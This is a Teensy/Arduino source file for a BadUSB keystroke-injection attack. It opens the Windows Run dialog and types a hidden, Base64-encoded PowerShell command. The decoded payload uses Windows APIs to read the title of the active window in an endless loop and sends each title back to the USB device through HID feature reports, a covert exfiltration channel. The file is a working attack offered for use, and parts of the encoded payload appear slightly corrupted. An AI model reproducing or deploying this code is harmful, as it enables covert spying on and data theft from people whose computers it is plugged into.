#include <Arduino.h>
#include <TeensyThreads.h>
#include <usb_keyboard.h>

#include "UsbKeyboardMutex.h"
#include "injector.h"

void injectPowerShellPayload() {
    Threads::Scope lock(usbKeyboardMutex());

    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(600); 

    Keyboard.print("powershell -w h -enc ");
    // Ton bloc Base64...
    Keyboard.print("JABzAD0AQAAnAAoAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAdQBzAGUAcgAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AEYAbwByAGUAZwByAG8AdQBuAGQAVwBpAG4AZABvAHcAKAApADsACgBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgB1AHMAZQByADMAMgAuAGQAbABsACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGkAbgB0ACAARwBlAHQAVwBpAG4AZABvAHcAVABlAHgAdAAoAEkAbgB0AFAAdAByACAAaAAsAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAFMAdAByAGkAbgBnAEIAdQBpAGwAZABlAHIAIABzACwAaQBuAHQAIABuACkAOwAKAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAQwByAGUAYQB0AGUARgBpAGwAZQAoAHMAdAByAGkAbgBnACAAbgAsAHUAaQBuAHQAIABhACwAdQBpAG4AdAAgAHMALABJAG4AdABQAHQAcgAgAHAALAB1AGkAbgB0ACAAZAAsAHUAaQBuAHQAIABmACwASQBuAHQAUAB0AHIAIABoACkAOwAKAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGgAaQBkAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAEgAaQBkAEQAXwBTAGUAdABGAGUAYQB0AHUAcgBlACgASQBuAHQAUAB0AHIAIABoACwAYgB5AHQAZQBbAF0AIABiACwAaQBuAHQAIABsACkAOwAKACcAQAAKACQAYQA9AEEAZABkAC0AVAB5AHAAZQAgAC0ATQAgACQAcwAgAC0ATgAgAFcAMwAyACAALQBQAGEAcwBzAFQAaAByAHUACgAjACAATwBuACAAYwBpAGIAbABlACAAbAAnAGkAbgB0AGUAcgBmAGEAYwBlACAATQBJAF8AMAA1ACAAZAB1ACAAVABlAGUAbgBzAHkACgAkAGQAZQB2AGkAYwBlAD0ARwBlAHQALQBQAG4AcABEAGUAdgBpAGMAZQB8AD8AewAkAF8ALgBJAG4AcwB0AGEAbgBjAGUASQBkACAALQBtAGEAdABjAGgAIAAiAFYASQBEAF8AMQA2AEMAMAAmAFAASQBEAF8AMAA0ADgANwAmAE0ASQBfADAANQAiAH0ACgAkAHAAPQAoAEcAZQB0AC0AUABuAHAARABlAHYAaQBjAGUAUAByAG8AcABlAHIAdAB5ACAALQBJAG4AcwB0AGEAbgBjAGUASQBkACAAJABkAGUAdgBpAGMAZQBzAAsAaQBuAHQAZQByAGYAYQBjAGUAWwAwAF0ALgBJAG4AcwB0AGEAbgBjAGUASQBkACAALQABLAGUAeQBOAGEAbQBlACAAIgBEAEUAVgBQAEsARQBZAF8ARABlAHYAaQBjAGUAXwBQAEQATwBOAGEAbQBlACIAKQAuAEQAYQB0AGEACgAkAGgAPQAkAGEAOgA6AEMAcgBlAGEAdABlAEYAaQBsAGUAKAAkAHAALAAwAHgAQwAwADAAMAAwADAAMAAwACwAMwAsAFsASQBuAHQAUAB0AHIAAF0AOgA6AFoAZQByAG8ALAAzACwAMAAsAFsASQBuAHQAUAB0AHIAAF0AOgA6AFoAZQByAG8AKQAKACQAbAA9ACIAIgAKAHcAaABpAGwAZQAoADEAKQB7AAoAIAAgACAAIAAkAHcAPQAkAGEAOgA6AEcAZQB0AEYAbwByAGUAZwByAG8AdQBuAGQAVwBpAG4AZABvAHcAKAApAAoAIAAgACAAIAAkAGIAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AUwB0AHIAaQBuAGcAQgB1AGkAbABkAGUAcgAgADIANQA2AAoAIAAgACAAIAAkAGEAOgA6AEcAZQB0AFcAaQBuAGQAbwB3AFQAZQB4AHQAKAAkAHcALAAkAGIALAAyADUANgApAAoAIAAgACAAIAAkAHQAPQAkAGIALgBUAG8AUwB0AHIAaQBuAGcAKAApAAoAIAAgACAAIABpAGYAKAAkAHQAIAAtAG4AZQAgACQAbAAgAC0AYQBuAGQAIAAkAHQAIAAtAG4AZQAgACIAIgApAHsACgAgACAAIAAgACAAIAAgACAAJABsAD0AJAB0AAoAIAAgACAAIAAgACAAIAAgACQAZgA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABiAHkAdABlAFsAXQAgADYANQAKACAAIAAgACAAIAAgACAAIAAkAGYAWwAwAF0APQA0ACAAIwAgAFIAZQBwAG8AcgB0ACAASQBEAAoAIAAgACAAIAAgACAAIAAgACQAZQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAdAApAAoAIAAgACAAIAAgACAAIAAgAFsAQQByAHIAYQB5AF0AOgA6AEMAbwBwAHkAKAAkAGUALAAwACwAJABmACwAMQAsAFsATQBhAHQAaABdADoAOgBNAGkAbgAoACQAZQAuAEwAZQBuAGcAdABoACwANgA0ACkAKQAKACAAIAAgACAAIAAgACAAIAAkAGEAOgA6AEgAaQBkAEQAXwBTAGUAdABGAGUAYQB0AHUAcgBlACgAJABoACwAJABmACwANgA1ACkACgAgACAAIAAgAH0ACgAgACAAIAAgAFMAbABlAGUAcAAgAC0AbQAgADUAMAAwAAoAfQA=");
    
    delay(200);
    Keyboard.press(KEY_ENTER);
    Keyboard.releaseAll();
}
